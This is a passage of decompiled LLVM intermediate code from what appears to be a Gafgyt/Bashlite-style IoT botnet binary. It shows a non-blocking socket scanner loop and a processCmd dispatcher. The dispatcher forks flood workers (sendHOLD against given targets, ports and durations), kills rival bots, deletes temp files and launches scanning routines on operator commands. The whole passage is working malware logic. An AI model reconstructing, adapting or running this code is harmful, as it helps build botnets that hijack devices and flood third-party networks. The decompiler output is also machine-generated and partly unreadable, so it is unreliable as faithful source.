  %storemerge359 = phi i32 [ %v1_11844, %dec_label_pc_11840 ], [ 0, %dec_label_pc_1184c.preheader ]
  store i32 %v3_113a0, i32* %r2.global-to-local, align 4
  %v3_1142c = mul i32 %storemerge359, 8
  %v2_11434 = add i32 %v2_11430, %v3_1142c
  %v1_11438 = inttoptr i32 %v2_11434 to i8*
  %v2_11438 = load i8, i8* %v1_11438, align 4
  %v6_11444 = icmp eq i8 %v2_11438, 0
  %v7_11444 = icmp eq i8 %v2_11438, 1
  br i1 %v7_11444, label %dec_label_pc_11558.lr.ph, label %dec_label_pc_1144c

dec_label_pc_1144c:                               ; preds = %dec_label_pc_11420
  %v7_11450 = icmp eq i8 %v2_11438, 2
  br i1 %v7_11450, label %dec_label_pc_1172c.lr.ph, label %dec_label_pc_11458

dec_label_pc_11458:                               ; preds = %dec_label_pc_1144c
  br i1 %v6_11444, label %dec_label_pc_11468, label %dec_label_pc_11840

dec_label_pc_11468:                               ; preds = %dec_label_pc_11458
  store i32 %storemerge359, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_11478 = call i32 @socket()
  %v2_11484 = load i32, i32* @r4, align 4
  %v5_11484 = mul i32 %v2_11484, 8
  %v6_11484 = add i32 %v5_11484, %v3_113a0
  %v7_11484 = inttoptr i32 %v6_11484 to i32*
  store i32 %v0_11478, i32* %v7_11484, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v5_11490 = add i32 %v3_1142c, %v3_113a0
  %v6_11490 = inttoptr i32 %v5_11490 to i32*
  %v7_11490 = load i32, i32* %v6_11490, align 4
  store i32 %v7_11490, i32* @r4, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_1149c = load i32, i32* %v6_11490, align 4
  store i32 %v7_1149c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_114ac = call i32 @__libc_fcntl(i32 %v7_1149c, i32 3)
  %v1_114b4 = or i32 %v2_114ac, 2048
  store i32 %v1_114b4, i32* @r3, align 4
  %v0_114b8 = load i32, i32* @r4, align 4
  store i32 %v1_114b4, i32* %r2.global-to-local, align 4
  %v2_114c4 = call i32 @__libc_fcntl(i32 %v0_114b8, i32 4)
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_114d0 = load i32, i32* %v6_11490, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_114e4 = call i32 @__libc_connect(i32 %v7_114d0, %sockaddr* %v3_114e4, i32 16)
  %v3_114ec = icmp eq i32 %v4_114e4, -1
  br i1 %v3_114ec, label %dec_label_pc_114f4, label %dec_label_pc_11508

dec_label_pc_114f4:                               ; preds = %dec_label_pc_11468
  %v0_114f4 = call i32 @__GI___errno_location()
  %v1_114fc = inttoptr i32 %v0_114f4 to i32*
  %v2_114fc = load i32, i32* %v1_114fc, align 4
  %v7_11500 = icmp eq i32 %v2_114fc, 115
  br i1 %v7_11500, label %dec_label_pc_11520, label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_11468, %dec_label_pc_114f4
  store i32 %v3_113a0, i32* %r2.global-to-local, align 4
  %v7_11510 = load i32, i32* %v6_11490, align 4
  %v1_11518 = call i32 @__GI_close(i32 %v7_11510)
  br label %dec_label_pc_11840

dec_label_pc_11520:                               ; preds = %dec_label_pc_114f4
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_11558.lr.ph:                         ; preds = %dec_label_pc_11420
  br label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %dec_label_pc_11558.lr.ph, %dec_label_pc_11558
  %storemerge513 = phi i32 [ 0, %dec_label_pc_11558.lr.ph ], [ %v1_1156c, %dec_label_pc_11558 ]
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  %v5_11564 = mul nuw nsw i32 %storemerge513, 4
  %v6_11564 = add i32 %v5_11564, %v2_11544
  %v7_11564 = inttoptr i32 %v6_11564 to i32*
  store i32 0, i32* %v7_11564, align 4
  %v1_1156c = add nuw nsw i32 %storemerge513, 1
  %tmp49 = icmp ult i32 %v1_1156c, 32
  br i1 %tmp49, label %dec_label_pc_11558, label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %dec_label_pc_11558
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v5_11588 = add i32 %v3_1142c, %v3_113a0
  %v6_11588 = inttoptr i32 %v5_11588 to i32*
  %v7_11588 = load i32, i32* %v6_11588, align 4
  %v3_1158c = udiv i32 %v7_11588, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_11598 = mul nuw nsw i32 %v3_1158c, 4
  %v2_115a4 = add i32 %v2_115a0, %v3_11598
  %v1_115a8 = inttoptr i32 %v2_115a4 to i32*
  %v2_115a8 = load i32, i32* %v1_115a8, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_115b4 = load i32, i32* %v6_11588, align 4
  %v1_115b8 = urem i32 %v7_115b4, 32
  %v6_115c0 = shl i32 1, %v1_115b8
  %v2_115c4 = or i32 %v6_115c0, %v2_115a8
  store i32 %v2_115c4, i32* %v1_115a8, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_115fc = load i32, i32* %v6_11588, align 4
  %v1_11600 = add i32 %v7_115fc, 1
  store i32 %v1_11600, i32* %r2.global-to-local, align 4
  %v1_1160c = load i32, i32* @sp, align 4
  %v2_1160c = inttoptr i32 %v1_1160c to i32*
  store i32 %v2_11608, i32* %v2_1160c, align 4
  %v0_11610 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  %v4_11620 = load i32, i32* %stack_var_-212, align 4
  %v5_11620 = call i32 @__libc_select(i32 %v0_11610, i32 0, i32 %v2_11544, i32 0, i32 %v4_11620)
  %v7_11630 = icmp eq i32 %v5_11620, 1
  br i1 %v7_11630, label %dec_label_pc_11638, label %dec_label_pc_116d4

dec_label_pc_11638:                               ; preds = %dec_label_pc_11580
  store i32 4, i32* %stack_var_-216, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_11648 = load i32, i32* %v6_11588, align 4
  store i32 %v7_11648, i32* %r2.global-to-local, align 4
  %v1_11654 = load i32, i32* @sp, align 4
  %v2_11654 = inttoptr i32 %v1_11654 to i32*
  store i32 %v2_11650, i32* %v2_11654, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_11668 = call i32 @getsockopt()
  %v3_1166c = load i32, i32* %stack_var_-220, align 4
  %v2_11670 = icmp eq i32 %v3_1166c, 0
  br i1 %v2_11670, label %dec_label_pc_116b0, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %dec_label_pc_11638
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_11680 = load i32, i32* %v6_11588, align 4
  %v1_11688 = call i32 @__GI_close(i32 %v7_11680)
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_116b0:                               ; preds = %dec_label_pc_11638
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_116d4:                               ; preds = %dec_label_pc_11580
  %v3_116d8 = icmp eq i32 %v5_11620, -1
  br i1 %v3_116d8, label %dec_label_pc_116e0, label %dec_label_pc_11840

dec_label_pc_116e0:                               ; preds = %dec_label_pc_116d4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_116e8 = load i32, i32* %v6_11588, align 4
  %v1_116f0 = call i32 @__GI_close(i32 %v7_116e8)
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_1172c.lr.ph:                         ; preds = %dec_label_pc_1144c
  br label %dec_label_pc_1172c

dec_label_pc_1172c:                               ; preds = %dec_label_pc_1172c.lr.ph, %dec_label_pc_1172c
  %storemerge49 = phi i32 [ 0, %dec_label_pc_1172c.lr.ph ], [ %v1_11740, %dec_label_pc_1172c ]
  store i32 %v2_11544, i32* %r2.global-to-local, align 4
  %v5_11738 = mul nuw nsw i32 %storemerge49, 4
  %v6_11738 = add i32 %v5_11738, %v2_11544
  %v7_11738 = inttoptr i32 %v6_11738 to i32*
  store i32 0, i32* %v7_11738, align 4
  %v1_11740 = add nuw nsw i32 %storemerge49, 1
  %tmp50 = icmp ult i32 %v1_11740, 32
  br i1 %tmp50, label %dec_label_pc_1172c, label %dec_label_pc_11754

dec_label_pc_11754:                               ; preds = %dec_label_pc_1172c
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v5_1175c = add i32 %v3_1142c, %v3_113a0
  %v6_1175c = inttoptr i32 %v5_1175c to i32*
  %v7_1175c = load i32, i32* %v6_1175c, align 4
  %v3_11760 = udiv i32 %v7_1175c, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_1176c = mul nuw nsw i32 %v3_11760, 4
  %v2_11778 = add i32 %v2_115a0, %v3_1176c
  %v1_1177c = inttoptr i32 %v2_11778 to i32*
  %v2_1177c = load i32, i32* %v1_1177c, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_11788 = load i32, i32* %v6_1175c, align 4
  %v1_1178c = urem i32 %v7_11788, 32
  %v6_11794 = shl i32 1, %v1_1178c
  %v2_11798 = or i32 %v6_11794, %v2_1177c
  store i32 %v2_11798, i32* %v1_1177c, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_117d0 = load i32, i32* %v6_1175c, align 4
  %v1_117d4 = add i32 %v7_117d0, 1
  store i32 %v1_117d4, i32* %r2.global-to-local, align 4
  %v1_117e0 = load i32, i32* @sp, align 4
  %v2_117e0 = inttoptr i32 %v1_117e0 to i32*
  store i32 %v2_11608, i32* %v2_117e0, align 4
  %v0_117e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_117f4 = load i32, i32* %stack_var_-212, align 4
  %v5_117f4 = call i32 @__libc_select(i32 %v0_117e4, i32 0, i32 0, i32 %v2_11544, i32 %v4_117f4)
  %v2_11804 = icmp eq i32 %v5_117f4, 0
  br i1 %v2_11804, label %dec_label_pc_11840, label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %dec_label_pc_11754
  store i32 %storemerge359, i32* %r2.global-to-local, align 4
  %v7_11814 = load i32, i32* %v6_1175c, align 4
  %v1_1181c = call i32 @__GI_close(i32 %v7_11814)
  store i32 %v2_11434, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11438, align 4
  br label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %dec_label_pc_11458, %dec_label_pc_116d4, %dec_label_pc_11754, %dec_label_pc_116e0, %dec_label_pc_116b0, %dec_label_pc_11678, %dec_label_pc_11520, %dec_label_pc_11508, %dec_label_pc_1180c
  %v1_11844 = add nuw nsw i32 %storemerge359, 1
  store i32 %v1_11844, i32* %r2.global-to-local, align 4
  %v5_11858 = icmp slt i32 %v1_11844, %v3_112fc
  br i1 %v5_11858, label %dec_label_pc_11420, label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %dec_label_pc_1184c.preheader, %dec_label_pc_11840, %dec_label_pc_1135c
  %v2_11860 = call i32 @time(i32* null)
  store i32 %v2_11860, i32* %r2.global-to-local, align 4
  %v5_11870 = icmp slt i32 %v2_11860, %v2_11408
  br i1 %v5_11870, label %dec_label_pc_1184c.preheader, label %dec_label_pc_11874

dec_label_pc_1184c.preheader:                     ; preds = %dec_label_pc_1185c
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1185456, label %dec_label_pc_11420, label %dec_label_pc_1185c

dec_label_pc_11874:                               ; preds = %dec_label_pc_1185c, %entry
  %v12_1187c = phi i32 [ %v3_11348, %entry ], [ %v2_11860, %dec_label_pc_1185c ]
  %v2_1187c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1187c, i32* @r4, align 4
  store i32 %v6_112cc, i32* @fp, align 4
  ret i32 %v12_1187c

; uselistorder directives
  uselistorder i32 %v1_11844, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_11438, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_11434, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_1142c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge359, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 14, 13, 12, 11, 15 }
  uselistorder i32 %v2_11544, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_113a0, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_112fc, { 1, 2, 0 }
  uselistorder i32 %v0_112ec, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 41, 38, 37, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 40, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 (i32, i32*)* @getHost, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11840, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1172c, { 1, 0 }
  uselistorder label %dec_label_pc_11558, { 1, 0 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_11884 = load i32, i32* @r4, align 4
  %v6_11884 = load i32, i32* @r5, align 4
  %v9_11884 = load i32, i32* @r6, align 4
  %v12_11884 = load i32, i32* @r7, align 4
  %v15_11884 = load i32, i32* @r8, align 4
  %v18_11884 = load i32, i32* @fp, align 4
  store i32 71820, i32* %stack_var_-4, align 4
  %v2_11888 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11888, i32* @fp, align 4
  %v2_1189c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1f934.57 to i32), i32* @r1, align 4
  %v3_118a8 = inttoptr i32 %v2_1189c to i8*
  %v4_118a8 = call i32 @__GI_strcoll(i8* %v3_118a8, i32 ptrtoint ([5 x i8]* @global_var_1f934.57 to i32))
  %v2_118b0 = icmp eq i32 %v4_118a8, 0
  br i1 %v2_118b0, label %dec_label_pc_118b8, label %dec_label_pc_118d0

dec_label_pc_118b8:                               ; preds = %entry
  %v2_118bc = load i32, i32* @global_var_2e45c.55, align 4
  %v3_118c8 = call i32 @HackerPrint(i32 %v2_118bc, i32 ptrtoint ([6 x i8]* @global_var_23e6c.1200 to i32))
  br label %dec_label_pc_12bf0

dec_label_pc_118d0:                               ; preds = %entry
  %v2_118d4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_23e74.1202 to i32), i32* @r1, align 4
  %v3_118e0 = inttoptr i32 %v2_118d4 to i8*
  %v4_118e0 = call i32 @__GI_strcoll(i8* %v3_118e0, i32 ptrtoint ([11 x i8]* @global_var_23e74.1202 to i32))
  %v2_118e8 = icmp eq i32 %v4_118e0, 0
  br i1 %v2_118e8, label %dec_label_pc_118f0, label %dec_label_pc_1191c

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118d0
  %v2_118f4 = load i32, i32* @global_var_2e45c.55, align 4
  store i32 %v2_118f4, i32* @r4, align 4
  %v2_118fc = load i32, i32* @global_var_346b4.479, align 4
  store i32 %v2_118fc, i32* @r0, align 4
  %v1_11900 = call i32 @__GI_inet_ntoa(i32 %v2_118fc)
  %v0_11908 = load i32, i32* @r4, align 4
  store i32 %v1_11900, i32* @r2, align 4
  %v3_11914 = call i32 @HackerPrint(i32 %v0_11908, i32 ptrtoint ([10 x i8]* @global_var_23e80.1205 to i32))
  br label %dec_label_pc_12bf0

dec_label_pc_1191c:                               ; preds = %dec_label_pc_118d0
  %v2_11920 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_23e8c.1207 to i32), i32* @r1, align 4
  %v3_1192c = inttoptr i32 %v2_11920 to i8*
  %v4_1192c = call i32 @__GI_strcoll(i8* %v3_1192c, i32 ptrtoint ([8 x i8]* @global_var_23e8c.1207 to i32))
  %v2_11934 = icmp eq i32 %v4_1192c, 0
  br i1 %v2_11934, label %dec_label_pc_1193c, label %dec_label_pc_11970

dec_label_pc_1193c:                               ; preds = %dec_label_pc_1191c
  %v0_1193c = call i32 @listFork()
  %v2_11944 = icmp eq i32 %v0_1193c, 0
  br i1 %v2_11944, label %dec_label_pc_1194c, label %dec_label_pc_11970

dec_label_pc_1194c:                               ; preds = %dec_label_pc_1193c
  %v2_11950 = load i32, i32* @global_var_2e45c.55, align 4
  %v3_1195c = call i32 @HackerPrint(i32 %v2_11950, i32 ptrtoint ([13 x i8]* @global_var_23e94.1209 to i32))
  %v1_11960 = call i32 @botkiller(i32 %v3_1195c)
  %v1_11964 = call i32 @RemoveTMP(i32 %v1_11960)
  %v1_1196c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11970:                               ; preds = %dec_label_pc_1193c, %dec_label_pc_1191c
  %v2_11974 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23ea4.1211 to i32), i32* @r1, align 4
  %v3_11980 = inttoptr i32 %v2_11974 to i8*
  %v4_11980 = call i32 @__GI_strcoll(i8* %v3_11980, i32 ptrtoint ([7 x i8]* @global_var_23ea4.1211 to i32))
  %v2_11988 = icmp eq i32 %v4_11980, 0
  br i1 %v2_11988, label %dec_label_pc_11990, label %dec_label_pc_119c0

dec_label_pc_11990:                               ; preds = %dec_label_pc_11970
  %v0_11990 = call i32 @listFork()
  %v2_11998 = icmp eq i32 %v0_11990, 0
  br i1 %v2_11998, label %dec_label_pc_119a0, label %dec_label_pc_119c0

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11990
  %v2_119a4 = load i32, i32* @global_var_2e45c.55, align 4
  %v3_119b0 = call i32 @HackerPrint(i32 %v2_119a4, i32 ptrtoint ([16 x i8]* @global_var_23eac.1213 to i32))
  %v1_119b4 = call i32 @LoopPayload(i32 %v3_119b0)
  %v1_119bc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_119c0:                               ; preds = %dec_label_pc_11990, %dec_label_pc_11970
  %v2_119c4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23ebc.1215 to i32), i32* @r1, align 4
  %v3_119d0 = inttoptr i32 %v2_119c4 to i8*
  %v4_119d0 = call i32 @__GI_strcoll(i8* %v3_119d0, i32 ptrtoint ([7 x i8]* @global_var_23ebc.1215 to i32))
  %v2_119d8 = icmp eq i32 %v4_119d0, 0
  br i1 %v2_119d8, label %dec_label_pc_119e0, label %dec_label_pc_11ae0

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119c0
  %v7_119e4 = icmp eq i32 %arg1, 2
  br i1 %v7_119e4, label %dec_label_pc_11a04, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e0
  %v2_119f0 = load i32, i32* @global_var_2e45c.55, align 4
  %v3_119fc = call i32 @HackerPrint(i32 %v2_119f0, i32 ptrtoint ([16 x i8]* @global_var_23ec4.1217 to i32))
  br label %dec_label_pc_12bf0

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119e0
  %v1_11a08 = add i32 %tmp, 4
  %v1_11a0c = inttoptr i32 %v1_11a08 to i32*
  %v2_11a0c = load i32, i32* %v1_11a0c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23ed4.1219 to i32), i32* @r1, align 4
  %v3_11a18 = inttoptr i32 %v2_11a0c to i8*
  %v4_11a18 = call i32 @__GI_strcoll(i8* %v3_11a18, i32 ptrtoint ([4 x i8]* @global_var_23ed4.1219 to i32))
  %v2_11a20 = icmp eq i32 %v4_11a18, 0
  br i1 %v2_11a20, label %dec_label_pc_11a28, label %dec_label_pc_11a6c

dec_label_pc_11a28:                               ; preds = %dec_label_pc_11a04
  %v2_11a2c = load i32, i32* @global_var_346bc.1221, align 4
  %v2_11a30 = icmp eq i32 %v2_11a2c, 0
  br i1 %v2_11a30, label %dec_label_pc_12bf0, label %dec_label_pc_11a38

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a28
  %v0_11a48 = call i32 @kill()
  %v2_11a50 = load i32, i32* @global_var_2e45c.55, align 4
  %v3_11a5c = call i32 @HackerPrint(i32 %v2_11a50, i32 ptrtoint ([5 x i8]* @global_var_23ed8.1223 to i32))
  store i32 0, i32* @global_var_346bc.1221, align 4
  br label %dec_label_pc_11a6c

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_11a04, %dec_label_pc_11a38
  %v2_11a74 = load i32, i32* %v1_11a0c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_23ee0.1225 to i32), i32* @r1, align 4
  %v3_11a80 = inttoptr i32 %v2_11a74 to i8*
  %v4_11a80 = call i32 @__GI_strcoll(i8* %v3_11a80, i32 ptrtoint ([3 x i8]* @global_var_23ee0.1225 to i32))
  %v2_11a88 = icmp eq i32 %v4_11a80, 0
  br i1 %v2_11a88, label %dec_label_pc_11a90, label %dec_label_pc_11ae0

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a6c
  %v2_11a94 = load i32, i32* @global_var_346bc.1221, align 4
  %v2_11a98 = icmp eq i32 %v2_11a94, 0
  br i1 %v2_11a98, label %dec_label_pc_11aa0, label %dec_label_pc_12bf0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a90
  %v0_11aa0 = call i32 @__libc_fork()
  %v2_11ab0 = icmp eq i32 %v0_11aa0, 0
  br i1 %v2_11ab0, label %dec_label_pc_11ad4, label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11aa0
  store i32 %v0_11aa0, i32* @global_var_346bc.1221, align 4
  br label %dec_label_pc_12bf0

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11aa0
  %v0_11ad4 = call i32 @StartTheLelz()
  %v1_11adc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11a6c, %dec_label_pc_119c0
  %v2_11ae4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_23ee4.1227 to i32), i32* @r1, align 4
  %v3_11af0 = inttoptr i32 %v2_11ae4 to i8*
  %v4_11af0 = call i32 @__GI_strcoll(i8* %v3_11af0, i32 ptrtoint ([6 x i8]* @global_var_23ee4.1227 to i32))
  %v2_11af8 = icmp eq i32 %v4_11af0, 0
  br i1 %v2_11af8, label %dec_label_pc_11b00, label %dec_label_pc_11b50

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11ae0
  %v7_11b04 = icmp eq i32 %arg1, 2
  br i1 %v7_11b04, label %dec_label_pc_11b0c, label %dec_label_pc_12bf0

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11b00
  %v1_11b10 = add i32 %tmp, 4
  %v1_11b14 = inttoptr i32 %v1_11b10 to i32*
  %v2_11b14 = load i32, i32* %v1_11b14, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_23ee0.1225 to i32), i32* @r1, align 4
  %v3_11b20 = inttoptr i32 %v2_11b14 to i8*
  %v4_11b20 = call i32 @__GI_strcoll(i8* %v3_11b20, i32 ptrtoint ([3 x i8]* @global_var_23ee0.1225 to i32))
  %v2_11b28 = icmp eq i32 %v4_11b20, 0
  br i1 %v2_11b28, label %dec_label_pc_11b30, label %dec_label_pc_11b50

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b0c
  %v2_11b34 = load i32, i32* @global_var_2e45c.55, align 4
  %v3_11b40 = call i32 @HackerPrint(i32 %v2_11b34, i32 ptrtoint ([25 x i8]* @global_var_23eec.1229 to i32))
  %v1_11b44 = call i32 @StartTheNetis(i32 %v3_11b40)
  %v1_11b4c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b0c, %dec_label_pc_11ae0
  %v2_11b54 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_23f08.1231 to i32), i32* @r1, align 4
  %v3_11b60 = inttoptr i32 %v2_11b54 to i8*
  %v4_11b60 = call i32 @__GI_strcoll(i8* %v3_11b60, i32 ptrtoint ([5 x i8]* @global_var_23f08.1231 to i32))
  %v2_11b68 = icmp eq i32 %v4_11b60, 0
  br i1 %v2_11b68, label %dec_label_pc_11b70, label %dec_label_pc_11cb4

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b50
  %v7_11b78 = icmp slt i32 %arg1, 4
  br i1 %v7_11b78, label %dec_label_pc_12bf0, label %dec_label_pc_11b7c

dec_label_pc_11b7c:                               ; preds = %dec_label_pc_11b70
  %v1_11b80 = add i32 %tmp, 8
  %v1_11b84 = inttoptr i32 %v1_11b80 to i32*
  %v2_11b84 = load i32, i32* %v1_11b84, align 4
  store i32 %v2_11b84, i32* @r0, align 4
  %v1_11b8c = call i32 @atol(i32 %v2_11b84)
  %tmp131 = icmp slt i32 %v1_11b8c, 1
  br i1 %tmp131, label %dec_label_pc_12bf0, label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b7c
  %v1_11ba0 = add i32 %tmp, 12
  %v1_11ba4 = inttoptr i32 %v1_11ba0 to i32*
  %v2_11ba4 = load i32, i32* %v1_11ba4, align 4
  store i32 %v2_11ba4, i32* @r0, align 4
  %v1_11bac = call i32 @atol(i32 %v2_11ba4)
  %v5_11bb8 = icmp sgt i32 %v1_11bac, 0
  br i1 %v5_11bb8, label %dec_label_pc_11bc0, label %dec_label_pc_12bf0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11b9c
  %v1_11bc4 = add i32 %tmp, 4
  %v1_11bc8 = inttoptr i32 %v1_11bc4 to i32*
  %v2_11bc8 = load i32, i32* %v1_11bc8, align 4
  %v2_11bd8 = load i32, i32* %v1_11b84, align 4
  store i32 %v2_11bd8, i32* @r0, align 4
  %v1_11be0 = call i32 @atol(i32 %v2_11bd8)
  %v2_11bf4 = load i32, i32* %v1_11ba4, align 4
  store i32 %v2_11bf4, i32* @r0, align 4
  %v1_11bfc = call i32 @atol(i32 %v2_11bf4)
  %v2_11c14 = call i32 @__GI_strchr(i32 %v2_11bc8, i32 44)
  %v2_11c1c = icmp eq i32 %v2_11c14, 0
  br i1 %v2_11c1c, label %dec_label_pc_11c8c, label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11bc0
  store i32 %v2_11bc8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_11c30 = call i32 @__GI_strtok(i32 %v2_11bc8, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_11c8057 = icmp eq i32 %v2_11c30, 0
  br i1 %v2_11c8057, label %dec_label_pc_11cb4, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %dec_label_pc_11c24, %dec_label_pc_11c68
  %storemerge2858 = phi i32 [ %v2_11c70, %dec_label_pc_11c68 ], [ %v2_11c30, %dec_label_pc_11c24 ]
  %v0_11c40 = call i32 @listFork()
  %v2_11c48 = icmp eq i32 %v0_11c40, 0
  br i1 %v2_11c48, label %dec_label_pc_11c50, label %dec_label_pc_11c68

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c40
  %v3_11c5c = call i32 @sendHOLD(i32 %storemerge2858, i32 %v1_11be0, i32 %v1_11bfc)
  %v1_11c64 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c40
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23e40.1184 to i32), i32* @r1, align 4
  %v2_11c70 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_23e40.1184 to i32))
  %v2_11c80 = icmp eq i32 %v2_11c70, 0
  br i1 %v2_11c80, label %dec_label_pc_11cb4, label %dec_label_pc_11c40

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11bc0
  %v0_11c8c = call i32 @listFork()
  %v2_11c94 = icmp eq i32 %v0_11c8c, 0
  br i1 %v2_11c94, label %dec_label_pc_11c9c, label %dec_label_pc_12bf0

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c8c
  %v3_11ca8 = call i32 @sendHOLD(i32 %v2_11bc8, i32 %v1_11be0, i32 %v1_11bfc)
  %v1_11cb0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11c68, %dec_label_pc_11c24, %dec_label_pc_11b50
  %v2_11cb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_23f10.1234 to i32), i32* @r1, align 4
